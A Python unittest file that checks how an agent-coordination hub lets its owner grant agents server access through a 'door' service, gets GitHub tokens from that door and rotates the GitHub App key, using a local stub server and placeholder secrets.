"""Server access through the door, the hub's side (owner feature server_access, UI-API.md 1.75, DevOps plan C4): the
server kind, given only by the owner; the refusals of the plan's section 2; a hub with a door asks it for GitHub tokens,
and a hub with no door keeps its own key; the door's record each minute; and the door as one more holder of the
central vault, whose sealed copies wait for the door at its own address."""
import base64
import contextlib
import json
import os
import threading
import time
import unittest
import urllib.parse
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest.mock import patch

import door_targets
import hub
from test_mobile import PHONE, Devices
from test_servers import OTHER, OWNER, Servers, git

DOOR = "127.0.0.20"             # the door's address in these tests: no machine of the fleet
STEPS = "1. Open https://keys.example.com/new. 2. Click Create key, and copy it into the card."   # a key's details


def load_tests(loader, _tests, _pattern):
    return unittest.TestSuite(cls(name) for cls in (ServerKind, DoorTokens, DoorCalls, PhoneYes, PhoneRecoveryCopy,
                                                    AppServers)
                              for name in cls.__dict__ if name.startswith("test_"))


class Access(Servers):
    def setUp(self):
        """The fixture's lead shares the server of vps, and an agent that shares its server holds no server through
        the door (grant_server). So the lead gets a server of its own here, and vps is alone on its own."""
        super().setUp()
        team = self.origin_team()
        team["addresses"]["lead-box"] = "127.0.0.9"
        team["agents"]["lead"]["machine"] = "lead-box"
        self.write_team(team)

    def write_team(self, team):
        (self.kit / "team.json").write_text(json.dumps(team, indent=2) + "\n")
        git("add", "team.json", cwd=self.kit)
        git("commit", "-q", "-m", "earlier owner writes", cwd=self.kit)
        git("push", "-q", "origin", "HEAD", cwd=self.kit)
        hub._revision_cache.update(at=0.0, value=None)
        hub.TEAM = json.loads(json.dumps(team))

    def grant(self, agent="vps", server="web-1", level="read", **extra):
        return self.owner("/ui/servers/grant", **dict(dict(agent=agent, server=server, level=level), **extra))


def refusal(call, target="aws:acme", action="call"):
    """A line of the door's record as the hub read it: the door refused this call, and wrote its hash. A Needs-you
    item with a door_call is held to it (hub.door_card_fits)."""
    n = (hub.q1("SELECT MAX(n) n FROM door_record")["n"] or 0) + 1
    hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why,call) VALUES(?,?,?,?,?,?,?,?,?)",
          (n, float(n), "vps", target, action, "refused", "refused", "the door's words", call))
    return call


def run_card(host="web-1", script="mv /srv/app/uploads /srv/app/uploads-old\n", **more):
    """The fields of the door's card of one refused run, with its line in the door's record."""
    call = refusal(hub.door_call_hash(host, "run", [], script.encode()), host, "run")
    return dict({"title": f"Run one root script on {host}?", "why": "Vps must move the uploads folder of its app.",
                 "what_to_do": f"Answer Run it once, or Full access on {host}", "door_call": call, "door_host": host,
                 "door_script": script}, **more)


class ServerKind(Access):
    def test_the_feature_is_offered(self):
        self.assertIn("server_access", self.request(source=OWNER)[1]["ui_features"])

    def test_the_owner_gives_read_and_fix_and_takes_it_back(self):
        status, receipt = self.grant(level="read")
        self.assertEqual(status, 200, receipt)
        self.assertEqual({k: receipt[k] for k in ("agent", "server", "level", "mode", "changed")},
                         {"agent": "vps", "server": "web-1", "level": "read", "mode": "fix", "changed": True})
        self.assertEqual(self.origin_team()["agents"]["vps"]["servers"], {"web-1": "read"})
        self.assertEqual(hub.resource_recorded("server:web-1", "vps"), "read")
        status, receipt = self.grant(level="fix")
        self.assertEqual((status, receipt["level"]), (200, "fix"))
        status, receipt = self.grant(server="mac-studio", level="read")
        self.assertEqual(receipt["mode"], "rule-only")           # a machine of the fleet: rule calls only
        self.assertEqual(self.grant(server="mac-studio", level="fix")[0], 409)     # Studio runs there (owner API 1.336)
        status, receipt = self.grant(level=None)
        self.assertEqual((status, receipt["changed"]), (200, True))
        self.assertEqual(self.origin_team()["agents"]["vps"]["servers"], {"mac-studio": "read"})
        self.assertEqual(hub.resource_recorded("server:web-1", "vps"), None)
        # The Access page shows nothing new: the app gives a server by its business tag (plan C5, "Yes, by business")
        view = self.request("/ui/resources?db=test-generation", source=OWNER)[1]
        self.assertNotIn("server", [k["kind"] for k in view["kinds"]])
        self.assertFalse([r for r in view["resources"] if r["id"].startswith("server:")])
        self.assertEqual(hub.resource_holders("server", "mac-studio"), [{"agent": "vps", "level": "read"}])

    def test_the_refusals_of_the_owner_route(self):
        self.assertEqual(self.grant(agent="nobody")[0], 404)
        status, answer = self.grant(agent="manager", server="hub")      # the manager's own server: free root there
        self.assertEqual(status, 409)
        self.assertIn("own server", answer["error"])
        status, answer = self.grant(server="vps")
        self.assertEqual((status, answer["error"]), (409, "vps is Vps's own server, where it has free root with no "
                                                          "door."))
        self.assertEqual(self.grant(level="root")[0], 400)
        self.assertEqual(self.grant(server="Web 1")[0], 400)
        self.assertEqual(self.grant(note="x")[0], 400)

    def test_only_the_owner_gives_a_server(self):
        self.grant(level="read")
        self.assertIn("the owner's alone to give", hub.grant_check("vps", "server:web-1", "read"))
        status, answer = self.owner("/ui/resources/take", resource="server:web-1", agent="vps")
        self.assertEqual(status, 409)
        self.assertIn("A server goes with its business: the owner's app gives each server to the DevOps agent of "
                      "the business whose Tailscale tag it carries", answer["error"])
        status, answer = self.owner("/ui/resources", resource="server:web-1", policy={"max": "read"},
                                    base_sha256=self.team_sha())
        self.assertEqual(status, 400, answer)
        self.assertIn("the owner's alone to give", answer["error"])

    def test_an_ask_for_a_server_names_the_agent_that_holds_it(self):
        """The door-modes proposal, step 1: server:<name> is a name of needs_access, and the hub's route names the
        agent that holds the server and gives it the work, never the owner a step by hand."""
        self.grant(agent="vps", server="web-1", level="fix")
        self.assertEqual(hub.access_needed("server:web-1", "fix"), ("server:web-1", "fix"))
        with self.assertRaisesRegex(hub.ToolError, r"tool:<MCP server> or server:<name>\. "):
            hub.access_needed("server", None)
        line = hub.access_route("studio", "server:web-1", "manager", "fix")
        self.assertIn("Held now by vps (fix): vps can do this part of the work", line)
        self.assertIn("give that part to vps with create_task", line)
        self.assertIn("Give the work on web-1 to the agent that holds it, which does it through the door, and raise "
                      "no Needs-you item that asks the owner to do the step by hand.", line)
        self.assertNotIn("Servers group", line)

    def test_team_json_takes_servers_of_a_worker_a_lead_or_the_manager_and_never_its_own(self):
        team = self.origin_team()
        team["agents"]["manager"]["servers"] = {"web-1": "fix"}     # version 1.122: until its business has a DevOps agent
        hub.validate_team(team)
        team["agents"]["manager"]["servers"] = {"hub": "fix"}
        with self.assertRaisesRegex(ValueError, "free root on its own server"):
            hub.validate_team(team)
        team = self.origin_team()
        team["agents"]["vps"]["servers"] = {"vps": "fix"}
        with self.assertRaisesRegex(ValueError, "free root on its own server"):
            hub.validate_team(team)
        team["agents"]["vps"]["servers"] = {"web-1": "admin"}
        with self.assertRaisesRegex(ValueError, "read, patch or fix"):
            hub.validate_team(team)

    def linux(self, *servers):
        """These servers of the fixture are Linux servers of the fleet, by team.json's own record."""
        team = self.origin_team()
        team["servers"] = dict(team.get("servers") or {}, **{name: {"kind": "linux", "user": "fleet"} for name in servers})
        self.write_team(team)

    def test_a_machine_of_the_fleet_is_held_at_patch_and_its_holder_s_own_server_too(self):
        """The fleet's own servers through the door (the owner, 17 November 2026, after three of them ran out of
        memory and each time a card asked him for a root command: "someone should probably have root, I dont want to
        be doing devops work on the fleet!"). The owner's app records them for one agent at patch: fixed root forms,
        and no command of the agent's own, so such a holding is no Fix, and the server still takes a new agent."""
        self.linux("vps")
        self.assertEqual(hub.fleet_machines(hub.TEAM), {"hub": hub.TEAM["addresses"]["hub"],
                                                        "vps": hub.TEAM["addresses"]["vps"]})    # no Mac, no unknown
        status, receipt = self.grant(agent="lead", server="vps", level="patch")
        self.assertEqual((status, receipt.get("level"), receipt.get("mode")), (200, "patch", "rule-only"), receipt)
        self.assertEqual(self.grant(agent="lead", server="hub", level="patch")[0], 200)
        self.assertEqual(self.origin_team()["agents"]["lead"]["servers"], {"hub": "patch", "vps": "patch"})
        self.assertEqual(hub.resource_recorded("server:vps", "lead"), "patch")
        self.assertEqual((hub.fix_holders(hub.TEAM, "vps"), hub.fix_holders(hub.TEAM, "hub")), ([], []))
        self.assertEqual(hub.door_callers_at(hub.TEAM, "lead-box"), ["lead"])       # the door knows it by its server
        view, servers = self.servers()
        self.assertNotIn("fix_holder", servers["vps"]["why"])
        self.assertIn("door_caller", servers["lead-box"]["why"])
        self.assertEqual(view["apps"], [])              # nothing new on the Servers page: no row, no mode menu
        hub.validate_team(self.origin_team())
        # its own server: the 13 November incident was on the DevOps agent's own server
        self.linux("vps", "lead-box")
        status, receipt = self.grant(agent="lead", server="lead-box", level="patch")
        self.assertEqual((status, receipt.get("mode")), (200, "rule-only"), receipt)
        status, answer = self.grant(agent="lead", server="lead-box", level="fix")
        self.assertEqual((status, answer["error"]), (409, "lead-box is Lead's own server, where it has free root with "
                                                          "no door."))
        # Fix is root: never on a server where an agent runs, the manager's own among them (owner API 1.336; the
        # security read of 22 November 2026), which would reach that agent's key
        for server in ("vps", "hub"):
            status, answer = self.grant(agent="lead", server=server, level="fix")
            self.assertEqual(status, 409, answer)
            self.assertIn(f"on {server}: Fix, which is root there, goes only to a server where no agent runs.",
                          answer["error"])
        # patch is the level of a machine of the fleet, and of no other host
        for server in ("web-1", "mac-studio"):
            status, answer = self.grant(agent="lead", server=server, level="patch")
            self.assertEqual(status, 409, answer)
            self.assertIn("is no Linux server of the fleet: patch is the level of a server that runs agents", answer["error"])
        self.assertEqual(self.grant(agent="lead", server="vps", level="root")[0], 400)
        # the hub's own server on a Mac is no fleet server: the host's root helper is for Linux
        with patch.object(hub, "server_kind_of", lambda team, name: "mac" if name == "hub" else "linux"):
            self.assertNotIn("hub", hub.fleet_machines(hub.TEAM))
            self.assertEqual(self.grant(agent="lead", server="hub", level="patch")[0], 409)
        # what the agent and its colleagues read
        text = hub.holdings_start_text("lead")
        self.assertIn("hub (patch), lead-box (patch), vps (patch); at patch", text)
        self.assertIn("at patch, a machine of the fleet, the fixed root forms only, with `ops <server> health`, which "
                      "says why it failed or is slow; the door's own server with `ops door:self <read>`, and a wrong "
                      "read name lists the reads", text)        # else no round of the holder knows door:self
        self.assertNotIn("look --content", text)
        self.assertIn("servers through the door hub (patch)", hub.colleague_line("lead"))
        # this fleet has no door, so no agent gets such a server, and the hub's words are the ones of before
        self.assertFalse(hub.fleet_server("vps"))
        self.assertEqual(self.grant(agent="lead", server="vps", level=None)[0], 200)
        self.assertIn("raise a Needs-you item and say what the work needs it for",
                      hub.access_route("studio", "server:vps", "manager"))
        self.assertNotIn("door_fleet", hub.access_route("studio", "server:vps", "manager", "fix"))
        self.assertIn("the owner's alone to give", hub.grant_check("vps", "server:web-1", "read"))     # as before
        # a Fix of before on a server where an agent runs, which no grant gives now: the manager hears of it once, to
        # ask the owner (the validator's S3 of 24 November 2026). The bug: such root stays and nobody is told
        team = self.origin_team()
        team["agents"]["lead"]["servers"] = {"vps": "fix"}
        self.write_team(team)
        said = []
        with patch.object(hub, "emit", lambda agent, kind, text, *a, **k: said.append((agent, text)) or 1):
            for _ in range(2):
                hub.keys_and_roots_told(hub.TEAM, hub.manager_name())
        told = [(agent, text) for agent, text in said if "holds Fix on vps" in text]
        self.assertEqual(len(told), 1, said)
        self.assertEqual(told[0][0], hub.manager_name())
        self.assertIn("root on vps reaches their keys", told[0][1])

    def test_a_machine_that_leaves_or_gets_another_name_takes_its_patch_holding_with_it(self):
        """A holding at patch names a machine of the fleet. Remove server, a machine's new Tailscale name and a restore
        onto another machine change the fleet's machines, and each of them was refused while the holder still had
        that server (found by both reviewers of this change): the holding goes with the machine's name, and the
        owner's app records it again under the name that it reads."""
        self.joined("box", "linux", source=OTHER, user="fleet")
        self.linux("vps")
        for server in ("box", "vps", "hub"):
            self.assertEqual(self.grant(agent="lead", server=server, level="patch")[0], 200, server)
        self.assertEqual(self.grant(agent="lead", server="web-1", level="fix")[0], 200)
        # Remove server
        status, receipt = self.owner("/ui/servers/box/remove", base_sha256=self.team_sha())
        self.assertEqual(status, 200, receipt)
        self.assertEqual(self.origin_team()["agents"]["lead"]["servers"], {"hub": "patch", "vps": "patch", "web-1": "fix"})
        self.assertIsNone(hub.resource_recorded("server:box", "lead"))
        # a machine's new name: the holding under the old name goes, and every other one stays
        team = hub.renamed_machine_team(self.origin_team(), "vps", "vps-2")
        self.assertEqual(team["agents"]["lead"]["servers"], {"hub": "patch", "web-1": "fix"})
        hub.validate_team(team)
        # a restore onto a hub whose machines have other names: only the holdings on machines of that fleet stay
        copy = self.origin_team()
        copy["addresses"]["old-box"] = "127.0.0.77"
        copy["agents"]["lead"]["servers"]["old-box"] = "patch"
        with patch.dict(hub.TEAM["addresses"], {"old-box": "127.0.0.77"}):
            kept = json.loads(hub.restored_team({"config": {"team.json": json.dumps(copy)}}))
        self.assertEqual(kept["agents"]["lead"]["servers"]["old-box"], "patch")
        here = dict(hub.TEAM["addresses"])
        del here["vps"]
        with patch.dict(hub.TEAM, {"addresses": here}):
            other = dict(copy, addresses={k: v for k, v in copy["addresses"].items() if k != "old-box"})
            restored = json.loads(hub.restored_team({"config": {"team.json": json.dumps(other)}}))
        self.assertNotIn("old-box", restored["agents"]["lead"]["servers"])
        self.assertEqual(restored["agents"]["lead"]["servers"]["web-1"], "fix")
        # a holding at patch on a host that is no machine is never a row of the servers for apps
        team = self.origin_team()
        team["agents"]["lead"]["servers"]["ghost-9"] = "patch"
        hub.validate_team(team)
        self.assertEqual([row["name"] for row in hub.app_servers_view(team)], ["web-1"])

    def test_a_move_onto_a_server_that_the_agent_holds_at_patch_keeps_that_holding(self):
        self.joined("box", "linux", source=OTHER, user="fleet")
        self.assertEqual(self.grant(agent="lead", server="box", level="patch")[0], 200)
        status, receipt = self.owner("/ui/team/agents/lead/move", base_sha256=self.team_sha(), server="box")
        self.assertEqual(status, 200, receipt)
        self.assertEqual(self.origin_team()["agents"]["lead"]["servers"], {"box": "patch"})

    def test_no_new_agent_and_no_move_onto_a_server_where_another_holds_fix(self):
        self.joined("box", "linux", source=OTHER, user="fleet")
        self.grant(agent="vps", server="box", level="fix")
        status, answer = self.add_agent("box", "scout", "codex")
        self.assertEqual(status, 409)
        self.assertIn("Vps holds Fix on box".lower(), answer["error"].lower())
        # lead, which has no Mac browser or screen (one OS user for each agent: those stay on a Mac)
        status, answer = self.owner("/ui/team/agents/lead/move", base_sha256=self.team_sha(), server="box")
        self.assertEqual(status, 409, answer)
        self.assertIn("holds Fix on box", answer["error"])

    def test_a_move_onto_a_server_it_holds_drops_that_grant(self):
        self.joined("box", "linux", source=OTHER, user="fleet")
        self.grant(agent="lead", server="box", level="fix")
        status, receipt = self.owner("/ui/team/agents/lead/move", base_sha256=self.team_sha(), server="box")
        self.assertEqual(status, 200, receipt)
        self.assertNotIn("servers", self.origin_team()["agents"]["lead"])

    def test_the_start_text_names_the_servers_and_ops(self):
        self.grant(level="fix")
        text = hub.holdings_start_text("vps")
        self.assertIn("servers through the door, each with `ops <server> <action>`", text)
        self.assertIn("web-1 (fix)", text)
        # incident intake, part 3: the holder at Fix reads the server's files itself, and its start says so
        self.assertIn("at fix, `ops <server> look --content <script>` reads its files and its apps' logs", text)
        self.grant(level="read")
        text = hub.holdings_start_text("vps")
        self.assertIn("web-1 (read)", text)
        self.assertNotIn("look --content", text)
        self.grant(level="fix")
        # and its colleagues read who holds the server, so that server work goes to it (the start's list of colleagues, hub.team_start_text)
        self.assertIn("servers through the door web-1 (fix)", hub.colleague_line("vps"))
        self.assertNotIn("servers through the door", hub.colleague_line("studio"))


class StubDoor(BaseHTTPRequestHandler):
    """A door on this machine: what the hub sends, and the answers of the test. skew: the seconds by which its clock is
    ahead of the hub's, in the Date of its answers."""
    calls, answers, skew = [], {}, 0

    def log_message(self, *a):
        pass

    def date_time_string(self, timestamp=None):         # skew None: a Date that says no time
        return "no time" if StubDoor.skew is None else super().date_time_string(time.time() + StubDoor.skew)

    def reply(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = json.loads(self.rfile.read(n)) if n else None
        StubDoor.calls.append((self.command, self.path, self.headers.get("Authorization"), body))
        found = StubDoor.answers.get(self.path.split("?")[0], (404, {}))
        status, answer = found(body) if callable(found) else found      # an answer by what the hub asks about
        raw = json.dumps(answer).encode()
        self.send_response(status)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    do_GET = do_POST = reply


class DoorTokens(Access):
    """A hub with a door asks it for GitHub tokens, with its first secret; a hub with no door keeps its own key."""

    def setUp(self):
        super().setUp()
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), StubDoor)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.addCleanup(self.httpd.server_close)
        self.addCleanup(self.httpd.shutdown)
        StubDoor.calls, StubDoor.answers, StubDoor.skew = [], {}, 0
        secrets = self.root / "door.json"
        secrets.write_text(json.dumps({"token": "token-secret", "record": "record-secret"}))
        hub.CFG["door_secrets"] = str(secrets)
        self.addCleanup(hub.CFG.pop, "door_secrets", None)
        team = self.origin_team()
        team["door"] = {"address": DOOR, "port": 8766}
        self.write_team(team)
        real = hub.door_call

        def to_stub(conf, method, path, secret, body=None, **more):
            return real(dict(conf, address="127.0.0.1", port=self.httpd.server_port), method, path, secret, body,
                        **more)
        patcher = patch.object(hub, "door_call", to_stub)
        patcher.start()
        self.addCleanup(patcher.stop)

    OLD, NEW = "bws://00000001-0000-4000-8000-000000000000", "bws://00000002-0000-4000-8000-000000000000"
    PAGE, PRINTED = "https://github.com/settings/apps/fleet-app", "SHA256:" + "A" * 43 + "="

    def two_keys(self):
        """The two App keys as the Mac app registers them (GitHubAppKey.place): the old one under the owner's plain
        name and its successor under a name of its own, each through Add secret's hub step, and both held by the door.
        A rule of the hub for a key's name that refuses the successor's name fails here. The central vault answers,
        and the owner signed both grants for the door."""
        central = patch.dict(hub.CENTRAL, dict(hub.CENTRAL_START, read_at=hub.now(), status={
            "recovery": "age1" + "e" * 58,
            "grants": [{"login": ref, "agent": "door", "machine": "door"} for ref in (self.OLD, self.NEW)]}),
            clear=True)
        central.start()
        self.addCleanup(central.stop)
        for ref, name in ((self.OLD, "GITHUB_APP_ACME_KEY"), (self.NEW, "GITHUB_APP_ACME_2_KEY")):
            status, said = self.owner("/ui/secrets/add", login=ref, title=name, kind="api_key", env=name,
                                      fingerprints=[])
            self.assertEqual((status, said.get("changed")), (200, True), said)
            self.assertEqual(self.owner("/ui/secrets/grant", login=ref, agent="door", grant="use")[0], 200)

    def keys(self, old_signs=None, new_signs=True, skew=0, in_use=None, in_use_status=200, **old):
        """The door's answer to each POST /github/key from now on, by the reference that the hub asks about: the old
        key, or with no reference the key in use, which is the one that the door's file names. old: other fields of
        the answer about the old key, and in_use of the answer about the key in use. skew: the seconds by which the
        door's clock is ahead. old_signs None: the door does not answer, as when GitHub does not say; in_use_status:
        the status of the answer about the key in use alone."""
        StubDoor.skew = skew
        if old_signs is None:
            StubDoor.answers["/github/key"] = (502, {"error": "GitHub did not say whether it takes the App key (500)"})
            return

        def answer(body):
            ref = body.get("ref") or self.NEW
            found = {"used": [self.NEW], "ref": ref, "signs": old_signs if ref == self.OLD else new_signs,
                     "fingerprint": self.PRINTED if ref == self.OLD else "SHA256:" + "B" * 43 + "="}
            found.update(old if ref == self.OLD else in_use or {})
            return (200 if ref == self.OLD else in_use_status), \
                dict(found, owner="acme", page=self.PAGE) if found["signs"] else found
        StubDoor.answers["/github/key"] = answer

    def test_a_task_session_s_tokens_come_from_the_door(self):
        StubDoor.answers["/github/token"] = (200, {"tokens": [{"token": "ghs_" + "a" * 36, "expires_at": "x",
                                                               "access": "write", "repos": ["acme/web"]}],
                                                   "errors": [{"repos": ["acme/ops"], "error": "no grant"}]})
        tokens, errors = hub.github_tokens({"acme/web": "write", "acme/ops": "write"}, "vps")
        self.assertEqual(([t["repos"] for t in tokens], errors[0]["repos"]), ([["acme/web"]], ["acme/ops"]))
        method, path, auth, body = StubDoor.calls[0]
        self.assertEqual((method, path, auth, body), ("POST", "/github/token", "Bearer token-secret",
                                                      {"agent": "vps", "repos": {"acme/web": "write",
                                                                                 "acme/ops": "write"}}))

    def test_the_app_key_that_the_hub_held_gets_a_successor_then_goes(self):
        """Plan 13, item 4 (the coordinator's yes of 7 November 2026): nothing starts before the first task session's
        tokens through the door worked. Then the manager hears the first item, the GitHub App rows show their form
        while it is open, the hub closes it when the door makes tokens with a new key, the manager hears the second
        item with the old key's fingerprint, and the hub closes that one when GitHub refuses the old key. An answer
        closes an item before its step is done ("Done" before the key is saved, the owner's case of 19 November 2026),
        and the form goes with it: the manager hears at the next look to raise it again, and a day after the hub's
        word for a step whose item it never raised, also when the old key was deleted first; never while an item is
        open. An item belongs to the step in which it was raised. A 401 for the old key closes the second item only
        at the second look in a row in which the key in use signs, the key under the old reference is the old one and
        the door's clock is near the hub's; at the twelfth such look in a row the hub takes the old key back from the
        door and out of the list of secrets, in one commit, and the successor stays."""
        def told(words):
            return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE ?",
                                             (f"%{words}%",))]

        def renew():
            return self.request("/ui/team?db=test-generation", source=OWNER)[1]["github"]["renew"]
        patcher = patch.dict(hub.DOOR_RENEW, {"at": 0.0, "form": 0.0})
        patcher.start()
        self.addCleanup(patcher.stop)
        (self.root / "door.json").write_text(json.dumps({"token": "token-secret", "record": "record-secret",
                                                         "app_id": "12345"}))
        old, new, page, printed = self.OLD, self.NEW, self.PAGE, self.PRINTED
        StubDoor.answers["/github/key"] = (200, {"used": [old], "ref": old, "fingerprint": printed, "signs": True,
                                                 "owner": "acme", "page": page})
        t0 = hub.now()
        self.assertIsNone(hub.door_renew(t0))
        self.assertEqual(StubDoor.calls, [])             # the first real task session's tokens come first
        alone = next(n for n, a in sorted(hub.TEAM["agents"].items())       # no agent key needed on its machine
                     if a.get("role") in ("worker", "lead") and not hub.shared_machine(n))
        team = self.origin_team()
        team["agents"][alone]["repos"] = {"acme/web": "write"}
        self.write_team(team)
        StubDoor.answers["/github/token"] = (200, {"tokens": [{"token": "ghs_" + "a" * 36, "expires_at": "x",
                                                               "access": "write", "repos": ["acme/web"]}],
                                                   "errors": []})
        status, got = self.request(f"/helper/integrations/{alone}", {},
                                   source=hub.TEAM["addresses"][hub.TEAM["agents"][alone]["machine"]])
        self.assertEqual(status, 200, got)
        self.assertTrue(hub.kv_get("door_first_token"))
        self.assertIsNone(hub.door_renew(t0))            # no Mac app that shows the form has read the door's view yet
        self.assertEqual(self.request("/ui/door?db=test-generation&renew=form", source=OWNER)[0], 200)
        state = hub.door_renew(t0)
        self.assertEqual((state["step"], state["old"], state["page"]), ("ask", old, page))
        self.assertEqual(StubDoor.calls[-1][1:], ("/github/key", "Bearer token-secret", {"app_id": "12345"}))
        asked = told('click "New key"')[0]              # the clicks of GitHub's page, read on 20 November 2026
        self.assertIn('github_key "acme"', asked)
        self.assertIn(f'on {page}, click "Credentials" in the left menu, open the tab "Key pairs"', asked)
        self.assertIn('click "Replace"', asked)         # the form's button while the hub has an App through the door
        self.assertIs(renew(), False)                    # no item yet, so no form
        with self.assertRaisesRegex(hub.ToolError, "no options"):
            hub.t_raise_needs_you("manager", {"title": "A new key", "why": "w", "what_to_do": "d",
                                              "github_key": "acme", "options": ["Done", "No"]})
        with self.assertRaisesRegex(hub.ToolError, "github_key is the GitHub account"):
            hub.t_raise_needs_you("manager", {"title": "A new key", "why": "w", "what_to_do": "d",
                                              "github_key": "other"})
        said = hub.t_raise_needs_you("manager", {"title": "A new key for your GitHub App", "why": "The hub held the "
                                                 "old one.", "what_to_do": f"On {page}, click New key",
                                                 "github_key": "acme"})
        self.assertIn("closes", said)
        first = hub.q1("SELECT max(id) AS id FROM needs")["id"]
        self.assertIs(renew(), True)
        self.assertIsNone(hub.door_renew(t0 + 10))       # one look each DOOR_RENEW_EVERY
        StubDoor.answers["/github/key"] = (200, {"used": [new], "ref": new, "fingerprint": printed, "signs": True,
                                                 "owner": "acme", "page": page})
        self.assertIsNone(hub.door_renew(t0 + hub.DOOR_RENEW_EVERY))     # the old key under another reference is
        self.assertEqual(hub.door_renewal()["step"], "ask")              # the old key: no word to delete it
        StubDoor.answers["/github/key"] = (200, {"used": [old], "ref": old, "fingerprint": printed, "signs": True,
                                                 "owner": "acme", "page": page})
        self.assertEqual(self.owner(f"/ui/needs/{first}", answer="Done")[0], 200)
        self.assertIs(renew(), False)                    # the answer closed the item, and the form went with it
        self.assertIsNone(hub.door_renew(t0 + 2 * hub.DOOR_RENEW_EVERY))
        again = told("Raise it again")
        self.assertEqual(len(again), 1)
        for words in (f"N-{first}", 'answer "Done"', 'github_key "acme"', 'click "New key"', "again in 1 day"):
            self.assertIn(words, again[0])
        t1 = t0 + 3 * hub.DOOR_RENEW_EVERY
        self.assertIsNone(hub.door_renew(t1))
        self.assertEqual(len(told("Raise it again")), 1)         # one word for that answer, then after a day
        refused = (200, {"used": [old], "ref": old, "fingerprint": printed, "signs": False})
        StubDoor.answers["/github/key"] = refused                # the old key deleted on GitHub, and no new one saved:
        t1 += hub.DOOR_RENEW_EVERY                               # at once, not after the day
        self.assertIsNone(hub.door_renew(t1))
        for words in ("no GitHub token through the door works", "again in 1 day"):
            self.assertIn(words, told("Raise it again")[1])
        StubDoor.answers["/github/key"] = (200, {"used": [old], "ref": old, "fingerprint": printed, "signs": True,
                                                 "owner": "acme", "page": page})
        self.assertIsNone(hub.door_renew(t1 + hub.DOOR_RENEW_EVERY))
        StubDoor.answers["/github/key"] = refused
        self.assertIsNone(hub.door_renew(t1 + 2 * hub.DOOR_RENEW_EVERY))
        self.assertEqual(len(told("Raise it again")), 2)         # a refusal that comes and goes starts it once
        t1 += hub.NEED_LOOK_FIRST
        self.assertIsNone(hub.door_renew(t1))
        self.assertIn("again in 2 days", told("Raise it again")[2])
        hub.t_raise_needs_you("manager", {"title": "A new key for your GitHub App", "why": "The hub does not see it "
                                          "yet.", "what_to_do": f"On {page}, click New key",
                                          "github_key": "acme"})
        first = hub.q1("SELECT max(id) AS id FROM needs")["id"]
        self.assertIs(renew(), True)
        StubDoor.answers["/github/key"] = (200, {"used": [new], "ref": new, "fingerprint": "SHA256:" + "B" * 43 + "=",
                                                 "signs": True, "owner": "acme", "page": page})
        with patch.object(hub, "now", lambda: t1 + hub.DOOR_RENEW_EVERY + 1):      # while the look that ends the step
            self.assertEqual(self.owner(f"/ui/needs/{first}", answer="Done")[0], 200)       # runs: an answer, and
            hub.t_raise_needs_you("manager", {"title": "A new key for your GitHub App", "why": "w",    # one more item
                                              "what_to_do": f"On {page}, click New key",
                                              "github_key": "acme"})
        third = hub.q1("SELECT max(id) AS id FROM needs")["id"]
        state = hub.door_renew(t1 + hub.DOOR_RENEW_EVERY)
        self.assertEqual(state["step"], "delete")
        self.assertIn("Closed by the hub", hub.q1("SELECT answer FROM needs WHERE id=?", (third,))["answer"])
        self.assertIs(renew(), False)
        for words in (printed, f'on {page}, click "Credentials" in the left menu and open the tab "Key pairs"'):
            self.assertIn(words, told('click "Delete" only beside the key whose fingerprint is')[0])
        self.assertIsNone(hub.door_renew(t1 + 2 * hub.DOOR_RENEW_EVERY))
        self.assertEqual(len(told("Raise it again")), 3)         # both items belong to the step before
        t2 = t1 + hub.DOOR_RENEW_EVERY + hub.NEED_LOOK_FIRST
        self.assertIsNone(hub.door_renew(t2))                    # the manager raised no second item in a day
        self.assertIn(printed, told("No Needs-you item with github_key")[0])
        hub.t_raise_needs_you("manager", {"title": "Delete the old key of your GitHub App", "why": "w",
                                          "what_to_do": f"On {page}, delete the key {printed}", "github_key": "acme"})
        second = hub.q1("SELECT max(id) AS id FROM needs")["id"]
        self.assertIs(renew(), False)                    # the form is for the first item only
        StubDoor.answers["/github/key"] = (200, {"used": [new], "ref": old, "fingerprint": printed, "signs": True,
                                                 "owner": "acme", "page": page})
        t2 += hub.NEED_LOOK_MOST
        self.assertIsNone(hub.door_renew(t2))
        self.assertEqual(len(told("Raise it again")), 4)         # an open item: no word, also a week later
        self.assertEqual(StubDoor.calls[-1][3], {"app_id": "12345", "ref": old})
        self.two_keys()
        hub.q("INSERT INTO door_copies(login,sealed,sha256,created) VALUES(?,?,?,?)", (old, "sealed", "0" * 64, t2))
        refused = dict(old_signs=False)
        for answers in (dict(old_signs=False, new_signs=False),      # a 401 for every key: the door's clock, the App
                        dict(old_signs=False, new_signs=False),      # and no second look of that kind counts
                        dict(old_signs=False, fingerprint="SHA256:" + "C" * 43 + "="),      # not the old key there
                        refused,                         # the first look that shows it, and each look between two
                        dict(old_signs=False, new_signs=False), refused,         # of them starts the count again:
                        dict(old_signs=False, skew=45), refused,                 # a clock 45 s ahead,
                        dict(old_signs=False, skew=None), refused,               # a Date that says no time,
                        dict(), refused,                                         # a look with no answer,
                        dict(old_signs=True), refused):                          # GitHub takes the old key
            self.keys(**answers)
            t2 += hub.DOOR_RENEW_EVERY
            self.assertIsNone(hub.door_renew(t2), answers)
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (second,))["answer"])
        self.assertEqual((hub.door_renewal()["step"], set(self.origin_team()["logins"])), ("delete", {old, new}))
        commits, hub.CENTRAL["due"] = int(git("rev-list", "--count", "HEAD", cwd=self.kit)), False
        t2 += hub.DOOR_RENEW_EVERY
        state = hub.door_renew(t2)                       # the second look in a row closes the item
        self.assertEqual(state["step"], "done")
        self.assertIn("refuses the old App key", hub.q1("SELECT answer FROM needs WHERE id=?", (second,))["answer"])
        self.assertIn("by itself in about an hour", told("the hub closed the second item")[0])
        changes = hub.CHANGE["state"]
        for _ in range(9):                               # the looks 3 to 11 in a row: the take-back, which nothing
            t2 += hub.DOOR_RENEW_EVERY                   # undoes, has a longer count than the closing of the item
            self.assertIsNone(hub.door_renew(t2))
        self.assertEqual(hub.CHANGE["state"], changes)   # the count is on no screen: its writes wake no app
